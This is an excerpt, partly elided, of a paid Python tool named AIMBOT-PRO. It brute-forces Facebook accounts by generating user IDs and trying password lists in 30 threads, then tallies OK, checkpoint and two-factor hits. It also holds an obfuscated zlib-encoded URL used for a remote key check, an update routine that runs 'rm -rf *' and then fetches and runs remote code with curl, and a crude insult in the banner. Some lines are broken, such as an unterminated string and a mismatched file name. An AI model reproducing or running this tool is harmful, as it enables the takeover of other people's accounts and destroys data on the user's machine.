...
def chk():
        ...
        if ua not in urll:
                ...
                if kex in requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,((\xabH\xd1K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd274\xd4\x07\x8ag\x94\xe4\xe6\x00\x00U\xba\x0e\xd8')).text:
                        print(' Wair for AIMBOT New update ');exit()
                else:
...
try:
        ...
        if updt in linx:
                ...
                os.system('cd $HOME && cd AIMBOT-PRO')
                os.system('rm -rf *')
                os.system("curl -L https://raw.githubusercontent.com/AIMBOT110/AKING-PRO/main/AIMBOT.py -o AKING.py && python AIMBOT.py")
...
----------------------------------------------
 ...
 Github    : Aimbotgod123
 Facebook  : Aimbot Fx
 Tool Name : AIMBOT-PRO
 Tool type : PAID
----------------------------------------------
 For Haters: Tumhare Okat Nhi Meri Gand Marny ki ðŸ¤ž
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        try:
                ...
                if kex in link:
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://m.facebook.com/story.php?story_fbid=1198168091111968&substory_index=0&id=100027563655285&mibextid=Nif5oz/);menu()
                        elif xd in ['0','00']:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Aimbot:     
                        clear()
                        tl = str(len(user))
...
def bd():
                ...
                with tred(max_workers=30) as Aimbot:     
                        ...
                        for psx in user:
                                ...
                                Aimbot.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
